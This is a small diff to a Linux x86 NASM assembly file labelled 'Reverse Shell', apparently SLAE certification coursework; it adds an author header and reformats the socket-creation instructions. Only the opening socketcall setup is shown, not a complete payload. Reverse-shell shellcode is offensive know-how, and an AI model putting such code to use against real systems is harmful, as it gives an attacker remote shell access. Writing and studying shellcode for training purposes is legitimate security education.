@@ -1,3 +1,8 @@
+;Reverse Shell - Linux/x86 NASM
+;Author: Nathu Nandwani
+;SecurityTube ID: SLAE-1261
+
+
 global _start
 section .text
 _start:
@@ -12,9 +17,9 @@ _start:
 	add bl, 0x02		; AF_INET = 2
 	push ebx		; ebx = 0xbb010002
 	
-	push eax			; Protocol
-	push 0x01 			; Type = SOCK_STREAM
-	push 0x02 			; Domain = AF_INET
+	push eax		; Protocol
+	push 0x01		; Type = SOCK_STREAM
+	push 0x02		; Domain = AF_INET
 		
 	mov al, 0x66		; SYS_SOCKETCALL
 	xor ebx, ebx	
